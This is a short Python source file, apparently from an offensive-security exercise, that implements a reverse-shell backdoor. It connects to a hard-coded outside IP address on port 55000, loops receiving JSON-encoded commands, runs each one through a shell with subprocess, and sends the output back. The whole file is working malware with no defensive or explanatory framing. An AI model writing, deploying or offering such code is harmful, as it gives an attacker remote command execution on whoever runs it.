#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor:

	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def reliable_send(self, data):
		json_data_send = json.dumps(data)
		self.connection.send(json_data_send)

	def reliable_recv(self, command):
		json_data_recv =""
		while True:
			try:
				json_data_recv = json_data_recv + self.connection.recv(1024)
				return json.loads(json_data_recv)
			except ValueError:
				continue

	def execute_command(self, command):
		return subprocess.check_output(command, shell = True)

	def run(self):
		while True:
			command = self.reliable_recv(1024)
			command_result = self.execute_command(command)
			self.reliable_send(command_result)
		connection.close()

my_backdoor = Backdoor("161.35.228.184", 55000)
my_backdoor.run()